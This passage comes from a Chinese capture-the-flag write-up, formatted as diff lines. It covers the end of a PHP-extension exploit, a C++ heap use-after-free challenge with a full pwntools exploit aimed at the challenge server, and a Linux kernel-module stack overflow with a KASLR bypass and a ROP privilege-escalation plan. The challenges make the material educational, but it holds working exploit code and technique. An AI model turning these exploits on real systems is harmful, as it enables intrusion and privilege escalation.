+    $pay = "/readflag\x00\x00\x00\x00\x00\x00\x00".chr($system_addr & 0xFF).chr(($system_addr >> 8) & 0xFF).chr(($system_addr >> 16) & 0xFF).chr(($system_addr >> 24) & 0xFF).chr(($system_addr >> 32) & 0xFF).chr(($system_addr >> 40) & 0xFF);
+    hackphp_edit($pay);
+    hackphp_delete();
+    // echo read();
+    ?>
+    
+
+  8. 附上调试过程中踩到的坑： 
+    * 在调用`zif_hackphp_get`的时候，要保证此时内存状态是正常的，因为： 
+        
+                void __fastcall zif_hackphp_get(zend_execute_data *execute_data, zval *return_value)
+        {
+          __int64 v2; // rax
+        
+          if ( buf && buf_size )
+          {
+            v2 = zend_strpprintf(0LL, "%s", buf);
+            return_value->value.lval = v2;
+            return_value->u1.type_info = (*(_DWORD *)(v2 + 4) & 0x40) == 0 ? 262 : 6;
+          }
+          else
+          {
+            return_value->u1.type_info = 2;
+          }
+        }
+        
+
+其中`zend_strpprintf`会调用到`_emalloc`申请临时buffer，之后用完会释放，若此时内存状态不正常，就会crash。
+
+    * 调试的时候可以手动实现一个`read`的功能，将php断住，便于下断点。至于`fopen`被禁用的问题，可以修改`php.ini`中的`disable_function`，把`fopen`给删掉即可。
+
+## 狡兔三窟
+
+  1. 首先分析一下几个重要的结构体，以及各个菜单的功能： 
+    * NoteStorageImpl： 
+        
+                struct NoteStorageImpl
+        {
+            struct NoteImpl *member_1; // offset = 0
+            struct NoteImpl *member_2; // offset = 8
+            struct NoteDBImpl *house;  // offset = 0x10
+        };
+        
+
+    * NoteImpl: 
+        
+                struct NoteImpl
+        {
+            void *func_get_encourage; // offset = 0
+            uint8_t vector_status;       // offset = 8
+            vector<char> buf_1;       // offset = 0x10
+        
+            vector<char> buf_2;          // offset = 0x1A0
+        
+            void *malloc;              // offset = 0x1B8    
+        }
+        
+
+    * NoteDBImpl 
+        
+                struct NoteDBImpl
+        {
+            struct NoteImpl *member; // offset = 0
+            uint8_t status;           // offset = 8
+        }
+        
+
+    * editHouse： 
+        
+                __int64 __fastcall NoteStorageImpl::editHouse(NoteStorageImpl *this)
+        {
+          NoteImpl *v1; // rax
+        
+          if ( (unsigned __int8)std::unique_ptr<NoteImpl>::operator bool(this) != 1 )
+            v1 = (NoteImpl *)std::unique_ptr<NoteImpl>::get((__int64)this + 8);
+          else
+            v1 = (NoteImpl *)std::unique_ptr<NoteImpl>::get((__int64)this);
+          return NoteImpl::add(v1);
+        }
+        
+
+判断`NoteStorageImpl`中的`member_1`是否为空，若不为空，则操作`member_1`，否则操作`member_2`。
+
+        
+                unsigned __int64 __fastcall NoteImpl::add(NoteImpl *this)
+        {
+          __int64 v1; // rax
+          __int64 v2; // rax
+          __int64 v3; // rax
+          _QWORD *v4; // rax
+          __int64 v5; // rax
+          char v7; // [rsp+17h] [rbp-9h] BYREF
+          unsigned __int64 v8; // [rsp+18h] [rbp-8h]
+        
+          v8 = __readfsqword(0x28u);
+          v7 = 0;
+          if ( *((_BYTE *)this + 8) != 1 )
+          {
+            v1 = std::operator<<<std::char_traits<char>>(&std::cout, "Do you want to clear it?(y/N)");
+            std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
+            std::operator>><char,std::char_traits<char>>(&std::cin, &v7);
+            if ( v7 == 'y' && *((_BYTE *)this + 8) != 1 )
+            {
+              v2 = std::operator<<<std::char_traits<char>>(&std::cout, "you can only clear once!!");
+              std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
+              std::vector<char>::clear((_QWORD *)this + 2);
+              *((_BYTE *)this + 8) = 1;
+            }
+          }
+          v3 = std::operator<<<std::char_traits<char>>(&std::cout, "content(q to quit):");
+          std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
+          while ( 1 )
+          {
+            v4 = (_QWORD *)std::operator>><char,std::char_traits<char>>(&std::cin, &v7);
+            if ( !(unsigned __int8)std::ios::operator bool((char *)v4 + *(_QWORD *)(*v4 - 0x18LL)) || v7 == 'q' )
+              break;
+            if ( (unsigned __int64)std::vector<char>::size((char *)this + 0x10) > 0x1000 )
+            {
+              v5 = std::operator<<<std::char_traits<char>>(&std::cout, "nonono!");
+              std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
+              exit(0);
+            }
+            std::vector<char>::push_back((char *)this + 16, &v7);
+          }
+          return __readfsqword(0x28u) ^ v8;
+        }
+        
+
+结构体`NoteImpl`成员`buf_1`都有一次`clear`的机会，除此之外，只能通过`push_back`追加，总长度最多为0x1000。
+
+    * saveHouse： 
+        
+                __int64 __fastcall NoteStorageImpl::saveHouse(NoteStorageImpl *this)
+        {
+          NoteImpl *v1; // rax
+          __int64 result; // rax
+          NoteImpl *v3; // rax
+          __int64 v4; // rax
+        
+          if ( (unsigned __int8)std::unique_ptr<NoteImpl>::operator bool(this) )
+          {
+            v1 = (NoteImpl *)std::unique_ptr<NoteImpl>::get((__int64)this);
+            result = NoteImpl::save(v1);
+          }
+          else if ( (unsigned __int8)std::unique_ptr<NoteImpl>::operator bool((char *)this + 8) )
+          {
+            v3 = (NoteImpl *)std::unique_ptr<NoteImpl>::get((__int64)this + 8);
+            result = NoteImpl::save(v3);
+          }
+          else
+          {
+            v4 = std::operator<<<std::char_traits<char>>(&std::cout, "You have no house to save!!!");
+            result = std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
+          }
+          return result;
+        }
+        
+
+顺序判断`member_1`和`member_2`是否为空，不为空，则调用：
+
+        
+                __int64 __fastcall NoteImpl::save(NoteImpl *this)
+        {
+          return std::vector<char>::shrink_to_fit((__int64)this + 16);
+        }
+        
+
+对相应`member_1`（或者`member_2`）结构体中的`buf_1`vector进行`shrink_to_fit`操作，即将vector的大小缩小到满足储存需要并且对齐0x10的最小值；从行为上看，是会将原来所占的buffer给先`free`掉，然后根据原vector的size重新再`malloc`空间。
+
+这是很关键的一个函数，由于vector的所占内存空间的增长方式是倍增，所以如果想要获得某个特定大小的vector，就可通过`shrink_to_fit`来实现，此时vector的倍增基数就变成了可控的大小。
+
+    * backup： 
+        
+                unsigned __int64 __fastcall NoteStorageImpl::backup(NoteStorageImpl *this)
+        {
+          __int64 v2; // [rsp+18h] [rbp-18h] BYREF
+          char v3[8]; // [rsp+20h] [rbp-10h] BYREF
+          unsigned __int64 v4; // [rsp+28h] [rbp-8h]
+        
+          v4 = __readfsqword(0x28u);
+          if ( (unsigned __int8)std::unique_ptr<NoteDBImpl>::operator bool((char *)this + 16) != 1 )
+          {
+            v2 = std::unique_ptr<NoteImpl>::get((__int64)this);
+            std::make_unique<NoteDBImpl,NoteImpl *>(v3, &v2);
+            std::unique_ptr<NoteDBImpl>::operator=((char *)this + 16, v3);
+            std::unique_ptr<NoteDBImpl>::~unique_ptr(v3);
+          }
+          return __readfsqword(0x28u) ^ v4;
+        }
+        
+
+判断`NoteStorageImpl`中的`house->status`是否为0，若为0则将`member_1`赋值给`house->member`。
+
+    * encourage： 
+        
+                __int64 __fastcall NoteStorageImpl::encourage(NoteStorageImpl *this)
+        {
+          NoteDBImpl *v1; // rax
+          __int64 result; // rax
+          __int64 v3; // rax
+        
+          if ( (unsigned __int8)std::unique_ptr<NoteDBImpl>::operator bool((char *)this + 16) )// judge if backed up
+          {
+            v1 = (NoteDBImpl *)std::unique_ptr<NoteDBImpl>::get((__int64)this + 16);
+            result = NoteDBImpl::getEncourage(v1);
+          }
+          else
+          {
+            v3 = std::operator<<<std::char_traits<char>>(&std::cout, "You can not get encourage now!");
+            result = std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
+          }
+          return result;
+        }
+        
+        __int64 __fastcall NoteDBImpl::getEncourage(NoteDBImpl *this)
+        {
+          __int64 result; // rax
+        
+          result = **((unsigned int **)this + 1);
+          if ( (_DWORD)result )
+            result = (***((__int64 (__fastcall ****)(_QWORD))this + 1))(*((_QWORD *)this + 1));
+          return result;
+        }
+        
+
+在`house`存在的情况下，且`house->member`以及`house->member->func_get_encourage`不为0，则调用相应的`house->member->func_get_encourage`函数。
+
+    * delHouse： 
+        
+                __int64 __fastcall NoteStorageImpl::delHouse(NoteStorageImpl *this)
+        {
+          NoteDBImpl *v1; // rax
+          __int64 result; // rax
+          __int64 v3; // rax
+        
+          if ( (unsigned __int8)std::unique_ptr<NoteDBImpl>::operator bool((char *)this + 16) )// judge if backed up
+          {
+            v1 = (NoteDBImpl *)std::unique_ptr<NoteDBImpl>::get((__int64)this + 16);
+            NoteDBImpl::setdel(v1);
+            result = std::unique_ptr<NoteImpl>::reset((__int64)this, 0LL);
+          }
+          else
+          {
+            v3 = std::operator<<<std::char_traits<char>>(&std::cout, "You can not delete now!");
+            result = std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
+          }
+          return result;
+        }
+        
+        NoteDBImpl *__fastcall NoteDBImpl::setdel(NoteDBImpl *this)
+        {
+          NoteDBImpl *result; // rax
+        
+          result = this;
+          *(_BYTE *)this = 1;
+          return result;
+        }
+        
+        __int64 __fastcall std::unique_ptr<NoteImpl>::reset(__int64 a1, __int64 a2)
+        {
+          __int64 v2; // rax
+          __int64 result; // rax
+          __int64 v4; // rax
+          __int64 v5; // [rsp+0h] [rbp-10h] BYREF
+          __int64 v6; // [rsp+8h] [rbp-8h]
+        
+          v6 = a1;
+          v5 = a2;
+          v2 = std::__uniq_ptr_impl<NoteImpl,std::default_delete<NoteImpl>>::_M_ptr(a1);
+          std::swap<NoteImpl *>(v2, &v5);
+          result = v5;
+          if ( v5 )
+          {
+            v4 = std::unique_ptr<NoteImpl>::get_deleter(v6);
+            result = std::default_delete<NoteImpl>::operator()(v4, v5);
+          }
+          return result;
+        }
+        
+
+在`house`存在的情况下，置`house->status`为1，并释放`house->member`内存空间以及置`NoteStorageImpl->member_1`为0。
+
+显然这里`house->member`本身并没有置0，且`delHouse`和`encourage`也没有检查就使用了，显然存在uaf。
+
+    * show： 
+        
+                int __fastcall NoteStorageImpl::show(NoteStorageImpl *this)
+        {
+          NoteDBImpl *v1; // rax
+          int result; // eax
+          __int64 v3; // rax
+        
+          if ( (unsigned __int8)std::unique_ptr<NoteDBImpl>::operator bool((char *)this + 16) )
+          {
+            v1 = (NoteDBImpl *)std::unique_ptr<NoteDBImpl>::get((__int64)this + 16);
+            result = NoteDBImpl::gift(v1);
+          }
+          else
+          {
+            v3 = std::operator<<<std::char_traits<char>>(&std::cout, "NO!");
+            result = std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
+          }
+          return result;
+        }
+        
+        int __fastcall NoteDBImpl::gift(NoteDBImpl *this)
+         {
+           int result; // eax
+        
+           result = *(unsigned __int8 *)this;
+           if ( (_BYTE)result )
+             result = puts(*((const char **)this + 1));
+           return result;
+         }
+        
+
+在`backup`并且`delHouse`之后（即`house->status = 1`），调用此函数可以打印出`house->member` 内容。
+
+  2. 根据以上分析，可以发现，当依次调用了`backup`和`delHouse`功能后，虽然`NoteStorageImpl->member_1 = 0`且空间被释放，但是`NoteStorageImpl->house->member`却没有清空；于是只要再把这块空间`malloc`出来，就可以通过`show`把该块chunk中残留的一些指针leak出来，同时如果把该`NoteImpl->func_get_encourage`给劫持成onegadget，再调用就可以getshell了。
+  3. 其实题目也有些小提示，比如特意在`NoteImpl`结构体中`offset = 0x1b8`的位置留了一个`malloc`的地址可以用来leak libc，在`offset = 0x1a0`的地方留一个vector结构体可以用来leak heap。
+  4. 整个利用思路如下： 
+    * 首先依次调用`backup`和`delHouse`，将`member_1`给释放掉；此时tcache中存在一个`size = 0x350`的chunk，接下来利用就是围绕这个chunk。
+    * 调用`editHouse`（此时不`clear`），写入0x1a0字节的数据，由于实际是通过不断地`push_back`写入的，所以最终会得到一个`size = 0x290`的chunk。
+    * 调用`save`，触发对上述提到的chunk进行`shrink_to_fit`，从而将`0x290`的chunk释放掉，得到一个`size = 0x1b0`的chunk。
+    * 继续进行`editHouse`，继续`push_back`写入0x10个字节数据，因为`push_back`的过程中，vector的size会不断增大，从而最终超过该chunk的size，vector就会进行倍增，从而`malloc`出一个`size = 0x350`的chunk，也就是拿到了`NoteStorageImpl->member_1`（或`NoteStorageImpl->house->member`）所在的chunk；这样再通过`show`就能leak出紧跟在后面的heap和malloc的地址。
+    * 最后调用`editHouse`，并`clear`掉vector，即后续`push_back`会从chunk头开始，这样就可以覆盖`house->member->func_get_encourage = onegadget`。
+    * 调用`encourage`功能，触发onegadget。
+  5. exp： 
+    
+        #!/usr/bin/env python
+    # -*- coding: utf-8 -*-    from pwn import *
+    import sys, os, re
+    
+    context(arch='amd64', os='linux', log_level='debug')
+    p = remote('106.14.216.214', 27972)
+    
+    p.sendlineafter(">> ", "3")
+    p.sendlineafter(">> ", "5")
+    p.sendlineafter(">> ", "1")
+    
+    p.sendlineafter("Do you want to clear it?(y/N)", "n")
+    p.sendlineafter("content(q to quit):", "A" * 0x1A0 + "q")
+    
+    p.sendlineafter(">> ", "2")
+    
+    p.sendlineafter(">> ", "1")
+    p.sendlineafter("Do you want to clear it?(y/N)", "n")
+    p.sendlineafter("content(q to quit):", "A" * 8 + "heapaddr" + "q")
+    
+    p.sendlineafter(">> ", "6")
+    p.recvuntil("heapaddr")
+    heap_base = u64(p.recv(6).ljust(8, "\x00")) - 0x121e5
+    
+    p.sendlineafter(">> ", "1")
+    p.sendlineafter("Do you want to clear it?(y/N)", "n")
+    p.sendlineafter("content(q to quit):", "libcaddr" + "q")
+    
+    p.sendlineafter(">> ", "6")
+    p.recvuntil("libcaddr")
+    libc_base = u64(p.recv(6).ljust(8, "\x00")) - libc.sym['malloc']
+    
+    p.sendlineafter(">> ", "1")
+    p.sendlineafter("Do you want to clear it?(y/N)", "y")
+    p.sendlineafter("content(q to quit):", p64(heap_base + 0x11e98) + p64(libc_base + 0x10a41c) + 'q')
+    
+    p.sendlineafter(">> ", "4")
+    
+    success("libc_base: " + hex(libc_base))
+    success("heap_base: " + hex(heap_base))
+    
+    p.interactive()
+    
+
+## liproll
+
+  1. 首先解包rootfs，查看init： 
+    
+        #!/bin/sh
+    
+    mount -t proc proc /proc
+    mount -t sysfs sysfs /sys
+    mount -t devtmpfs none /dev
+    mkdir -p /dev/pts
+    mount -vt devpts -o gid=4,mode=620 none /dev/pts
+    chmod 666 /dev/ptmx
+    echo 1 > /proc/sys/kernel/kptr_restrict
+    echo 1 > /proc/sys/kernel/dmesg_restrict
+    chown -R root:root /bin /usr /root
+    
+    echo "flag{this_is_a_test_flag}" > /root/flag
+    chmod -R 400 /root
+    chmod -R o-r /proc/kallsyms
+    chmod -R 755 /bin /usr
+    
+    cat /root/banner
+    insmod /liproll.ko
+    
+    chmod 777 /dev/liproll
+    
+    setsid /bin/cttyhack setuidgid 1000 /bin/sh
+    echo 'sh end!\n'
+    poweroff -d 1800000 -f &
+    umount /proc
+    umount /sys
+    
+    poweroff -d 0  -f
+    
+
+可以看出加载了一个名为liproll的driver，并且dmesg信息和/proc/kallsyms都不可读。
+
+从run.sh：
+
+    
+        #!/bin/sh
+    
+    qemu-system-x86_64 \
+        -kernel ./bzImage \
+        -append "console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr" \
+        -initrd ./rootfs.cpio \
+        -nographic \
+        -m 2G \
+        -smp cores=2,threads=2,sockets=1 \
+        -monitor /dev/null \
+    
+
+可以知道开启了kaslr保护。
+
+  2. 从rootfs中拿出liproll.ko分析，关键函数有： 
+    * liproll_unlocked_ioctl： 
+        
+                __int64 __fastcall liproll_unlocked_ioctl(__int64 a1, unsigned int a2, __int64 a3)
+        {
+          __int64 result; // rax
+        
+          if ( a2 == 0xD3C7F03 )
+          {
+            create_a_spell();
+            result = 0LL;
+          }
+          else if ( a2 > 0xD3C7F03 )
+          {
+            if ( a2 != 0xD3C7F04 )
+              return 0LL;
+            choose_a_spell(a3);
+            result = 0LL;
+          }
+          else
+          {
+            if ( a2 != 0xD3C7F01 )
+            {
+              if ( a2 == 0xD3C7F02 )
+              {
+                global_buffer = 0LL;
+                *(&global_buffer + 1) = 0LL;
+              }
+              return 0LL;
+            }
+            cast_a_spell(a3);
+            result = 0LL;
+          }
+          return result;
+        }
+        
+
+可以通俗地理解为菜单，提供了create，cast，choose，reset功能，其中：
+
+      * create: 
+            
+                        __int64 create_a_spell()
+            {
+             __int64 v0; // rax
+             __int64 v1; // rbx
+             __int64 result; // rax
+            
+             v0 = 0LL;
+             while ( 1 )
+             {
+               v1 = (int)v0;
+               if ( !lists[v0] )
+                 break;
+               if ( ++v0 == 0x10 )
+                 return printk("[-] Full!\n");
+             } 
+             result = kmem_cache_alloc_trace(kmalloc_caches[8], 0xCC0LL, 0x100LL);
+             if ( !result )
+               return create_a_spell_cold();
+             lists[v1] = result;
+             return result;
+            }
+            
+
+简单地通过kmalloc申请一个0x100的chunk，存在`list`数组里（这里`kmem_cache_alloc_trace(kmalloc_caches[8],
+0xCC0LL, 0x100LL);`个人认为可能是被优化了，行为上应该等价于`kmalloc(0x100)`，不过不是很重要。
+
+      * choose： 
+            
+                        void *__fastcall choose_a_spell(unsigned int *a1)
+            {
+              __int64 v1; // rax
+              void *result; // rax
+            
+              v1 = *a1;
+              if ( (unsigned int)v1 > 0xFF )
+                return (void *)choose_a_spell_cold();
+              result = (void *)lists[v1];
+              if ( !result )
+                return (void *)choose_a_spell_cold();
+              global_buffer = result;
+              *((_DWORD *)&global_buffer + 2) = 0x100;
+              return result;
+            }
+            
+
+把`list`数组中，给定下标中存在的指针赋值给`global_buffer`，并且把`*((_DWORD *)&global_buffer +
+2)`（其实就是size）设置为0x100。
+
+显然这里下标是来源于用户程序可控的，且判断只需要小于0x100，`list` 本身容量就是0x10，显然存在溢出。
+
+      * reset： 
+            
+                         global_buffer = 0LL;
+             *(&global_buffer + 1) = 0LL;
+            
+
+清空`global_buffer`并且设置`size = 0`。
+
+      * cast： 
+            
+                        unsigned __int64 __fastcall cast_a_spell(__int64 *a1)
+            {
+              unsigned int v1; // eax
+              int v2; // edx
+              __int64 v3; // rsi
+              _BYTE v5[256]; // [rsp+0h] [rbp-120h] BYREF
+              void *v6; // [rsp+100h] [rbp-20h]
+              int v7; // [rsp+108h] [rbp-18h]
+              unsigned __int64 v8; // [rsp+110h] [rbp-10h]
+            
+              v8 = __readgsqword(0x28u);
+              if ( !global_buffer )
+                return cast_a_spell_cold();
+              v6 = global_buffer;
+              v1 = *((_DWORD *)a1 + 2);
+              v2 = 0x100;
+              v3 = *a1;
+              if ( v1 <= 0x100 )
+                v2 = *((_DWORD *)a1 + 2);
+              v7 = v2;
+              if ( !copy_from_user(v5, v3, v1) )
+              {
+                memcpy(global_buffer, v5, *((unsigned int *)a1 + 2));
+                global_buffer = v6;
+            
+                *((_DWORD *)&global_buffer + 2) = v7;
+              }
+              return __readgsqword(0x28u) ^ v8;
+            }
+            
+
+这里`*((_DWORD *)a1 + 2);`是来自于用户程序的，且`copy_from_user`的size参数正好来自于`*((_DWORD *)a1
++ 2);`，而没有检查，所以存在stack overflow。
+
+这样，`v6`和`v7`的值都可以被覆盖，也就是说`glabal_buffer`和`size`都是完全可控的。
+
+    * read： 
+        
+                __int64 __fastcall liproll_read(__int64 a1, __int64 a2, __int64 a3)
+        {
+          _QWORD v5[35]; // [rsp+0h] [rbp-118h] BYREF
+        
+          v5[32] = __readgsqword(0x28u);
+          if ( global_buffer )
+          {
+            if ( (unsigned __int64)global_buffer >= vmlinux_base + 0x12EE908
+              && (unsigned __int64)global_buffer < vmlinux_base + 0x13419A0 )
+            {
+              return liproll_read_cold();
+            }
+            memcpy(v5, global_buffer, *((unsigned int *)&global_buffer + 2));
+            if ( !copy_to_user(a2, v5, a3) )
+              return a3;
+          }
+          return -1LL;
+        }
+        
+
+可以注意到这里的`memcpy`，在`*((unsigned int *)&global_buffer +
+2)`可控的情况下，同样存在溢出；也可以通过设置`size = 0`，或者放大`a3`参数的值，leak出栈上的数据。
+
+    * write： 
+        
+                __int64 __fastcall liproll_write(__int64 a1, __int64 a2, unsigned __int64 a3)
+        {
+          __int64 v3; // rbx
+          _BYTE *v4; // rcx
+          char *v5; // rdi
+          _QWORD v7[35]; // [rsp+0h] [rbp-118h] BYREF
+        
+          v7[32] = __readgsqword(0x28u);
+          if ( !global_buffer )
+            return -1LL;
+          v3 = 256LL;
+          if ( a3 <= 0x100 )
+            v3 = a3;
+          if ( copy_from_user(v7, a2, v3) )
+            return -1LL;
+          v4 = global_buffer;
+          if ( (unsigned int)v3 < 8 )
+          {
+            if ( (v3 & 4) != 0 )
+            {
+              *(_DWORD *)global_buffer = v7[0];
+              *(_DWORD *)&v4[(unsigned int)v3 - 4] = *(_DWORD *)((char *)v7 + (unsigned int)v3 - 4);
+            }
+            else if ( (_DWORD)v3 )
+            {
+              *(_BYTE *)global_buffer = v7[0];
+              if ( (v3 & 2) != 0 )
+                *(_WORD *)&v4[(unsigned int)v3 - 2] = *(_WORD *)((char *)v7 + (unsigned int)v3 - 2);
+            }
+          }
+          else
+          {
+            v5 = (char *)(((unsigned __int64)global_buffer + 8) & 0xFFFFFFFFFFFFFFF8LL);
+            *(_QWORD *)global_buffer = v7[0];
+            *(_QWORD *)&v4[(unsigned int)v3 - 8] = *(_QWORD *)((char *)&v7[-1] + (unsigned int)v3);
+            qmemcpy(v5, (char *)v7 - (v4 - v5), 8LL * ((unsigned int)(v3 + (_DWORD)v4 - (_DWORD)v5) >> 3));
+          }
+          return v3;
+        }
+        
+
+这个函数就是向`global_buffer`里写入数据。
+
+  3. 其次调试的过程中发现，这里的`kaslr`和用户态程序的`aslr`不太一样，不论是liproll模块的相关的函数地址，还是kernel的一些内核函数，都不是简单的相对于base address有一个固定的偏移，而近乎是完全随机的感觉；比如对于liproll模块： 
+    
+        / $ cat /sys/module/liproll/sections/.
+    ../                            .text.cast_a_spell
+    ./                             .text.check_bound
+    .bss                           .text.choose_a_spell
+    .data                          .text.create_a_spell
+    .exit.text                     .text.liproll_open
+    .gnu.linkonce.this_module      .text.liproll_read
+    .init.text                     .text.liproll_release
+    .note.Linux                    .text.liproll_unlocked_ioctl
+    .note.gnu.build-id             .text.liproll_write
+    .orc_unwind                    .text.reset_the_spell
+    .orc_unwind_ip                 .text.unlikely.cast_a_spell
+    .rodata.str1.1                 .text.unlikely.choose_a_spell
+    .rodata.str1.8                 .text.unlikely.create_a_spell
+    .strtab                        .text.unlikely.liproll_read
+    .symtab
+    
+
+每个函数都有独立的section，而这些section实际加载的地址都是不可预测的（当然section和section之间的相对偏移可能是有一定的预测性的，比如.bss和.data
+section相差0x4c0就是固定的，后面利用会用到这点）。
+
+同样的，从bzImage中提取出vmlinux分析，也可以发现，存在着类似的.text.func_name的section，使得`prepare_kernel_cred`和`commit_creds`偏移不是相对vmlinux_base固定；但是像`liproll_open`中通过`copy_page`函数地址算出vmlinux_base的时候，减去固定偏移，可以看出`copy_page`的偏移是固定的，同时vmlinux文件中不存在`.text.copy_page`的section。
+
+  4. 其次，在`liproll_read`这里，有一个check，即： 
+    
+        if ( (unsigned __int64)global_buffer >= vmlinux_base + 0x12EE908
+          && (unsigned __int64)global_buffer < vmlinux_base + 0x13419A0 )
+    {
+      return liproll_read_cold();
+    }
+    
+
+那么`vmlinux_base + 0x12EE908 ~ vmlinux_base +
+0x13419A0`这部分内存就显得很可疑，调试中发现，这部分内存正好是`__ksymtab`，`__ksmtab_gpl`和`ksymtab_strings`这三个section。
+
+重点在于，`__ksymtab`这个section，相当于一个`size=0xC`的结构体的数组，前4 bytes表示函数地址的偏移，中间4
+bytes表示函数名的偏移，最后4 bytes也是偏移：
+
+    
+        __ksymtab:FFFFFFFF822EE908 __ksymtab       segment dword public 'CONST' use64
+    __ksymtab:FFFFFFFF822EE908                 assume cs:__ksymtab
+    __ksymtab:FFFFFFFF822EE908                 ;org 0FFFFFFFF822EE908h
+    __ksymtab:FFFFFFFF822EE908 ; struct func_struct _ksymtab_array[5944]
+    __ksymtab:FFFFFFFF822EE908 __ksymtab_array dd 0FF15CB08h, 207DFh, 314F1h
+    __ksymtab:FFFFFFFF822EE908                                         ; DATA XREF: sub_FFFFFFFF81505000+11C↑o
+    __ksymtab:FFFFFFFF822EE908                                         ; sub_FFFFFFFF81505000+123↑o ...
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF331E4Ch, 29490h, 314E5h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4EC780h, 30040h, 314D9h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4ED4F4h, 30079h, 314CDh
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4ED4C8h, 300A8h, 314C1h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4EBE5Ch, 2FFECh, 314B5h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4EE630h, 30038h, 314A9h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4EC284h, 2FFE8h, 3149Dh
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4EEDA8h, 3005Ah, 31491h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4EBDFCh, 30000h, 31485h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF377750h, 2A291h, 31479h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF2A8794h, 26BC4h, 3146Dh
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF2A7538h, 26BB1h, 31461h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF2A751Ch, 26B94h, 31455h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF982850h, 48936h, 31449h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF5000A4h, 30CC7h, 3143Dh
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4D9CF8h, 2F487h, 31431h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4C3EDCh, 2E471h, 31425h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF2CF4C0h, 270CDh, 31419h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF97BA04h, 48682h, 3140Dh
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF32DE88h, 2912Bh, 31401h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4AA3DCh, 2D565h, 313F5h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF520h, 2E8E4h, 313E9h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF5E4h, 2E8FEh, 313DDh
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF7E8h, 2E954h, 313D1h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF4CCh, 2E878h, 313C5h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF450h, 2E85Dh, 313B9h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF664h, 2E8EFh, 313ADh
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF548h, 2E8A9h, 313A1h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF60Ch, 2E8C6h, 31395h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF720h, 2E8FFh, 31389h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CFB94h, 2E859h, 3137Dh
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CFA78h, 2E838h, 31371h
+    __ksymtab:FFFFFFFF822EE908                 dd 0FF4CF68Ch, 2E8BBh, 31365h
+    
+
+比如第一项`dd 0FF331E4Ch, 29490h, 314E5h`，计算出`(0x822EE908 + 0xFF15CB08C) & ((1 <<
+32) - 1) | (0xFFFFFFFF << 32) = 0xffffffff8144b410`；以及`(0x822EE90C + 0x207DF)
+& ((1 << 32) - 1) | (0xFFFFFFFF << 32) = 0xffffffff8230f0eb`:
+
+    
+        .text.IO_APIC_get_PCI_irq_vector:FFFFFFFF8144B410 ; FUNCTION CHUNK AT 
+    
+    __ksymtab_strings:FFFFFFFF8230F0EB aIoApicGetPciIr db 'IO_APIC_get_PCI_irq_vector',0
+    
+
+说明这就是个符号表，如果能够便利符号表查找`prepare_kernel_cred`和`commit_creds`的地址，那么问题就简单了。
+
+  5. 那么整个利用思路为： 
+    * 首先利用`liproll_read`把canary给leak出来
+    * 然后利用`cast_a_spell`功能存在的溢出，把`global_buffer`覆盖为任意非0值，以及`*((_DWORD *)&global_buffer + 2)`覆盖为0。
+    * 之后调用`liproll_read`的时候，由于`memcpy(v5, global_buffer, *((unsigned int *)&global_buffer + 2));`参数中`size = 0`，所以相当于没有执行，就能把栈上的残留数据leak出来；调试过程中发现leak出来的数据中，通过偏移为0x18的数据，可以得到liproll模块.data section的起始地址，即`uint64_t _data_sec = ((*(uint64_t *)(buf + 0x18) >> 12) << 12) + 0x2000;`，其次.bss section和.data section的偏移固定，为0x4c0，同样可以计算出.bss section的起始地址：`uint64_t _bss_sec = _data_sec + 0x4C0;`。
+    * 那么获得了.bss section的地址后，就能继续利用`cast_a_spell`存在的栈溢出，把`global_buffer`指向.bss上vmlinux_base的位置，这样就把vmlinux加载基址给leak出来了；于此同时，可以通过`liproll_write`将其覆盖为0，绕过之后调用`liproll_read`中的check： 
+        
+                if ( (unsigned __int64)global_buffer >= vmlinux_base + 0x12EE908
+              && (unsigned __int64)global_buffer < vmlinux_base + 0x13419A0 )
+        
+
+    * 通过不断地利用`cast_a_spell`中的栈溢出修改`global_buffer`，遍历`__ksymtab`，找到`prepare_kernel_cred`和`commit_creds`的地址。
+    * 最后只要构造rop提权即可，因为并没有开启smep保护，所以gadget可以在用户态程序中构造。
+  6. exp： 
+    
+        #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+    #include <inttypes.h>
+    #include <fcntl.h>
+    #include <sys/stat.h>
+    #include <sys/types.h>
+    #include <sys/ioctl.h>
+    #include <sys/mman.h>
+    #include <string.h>
+    
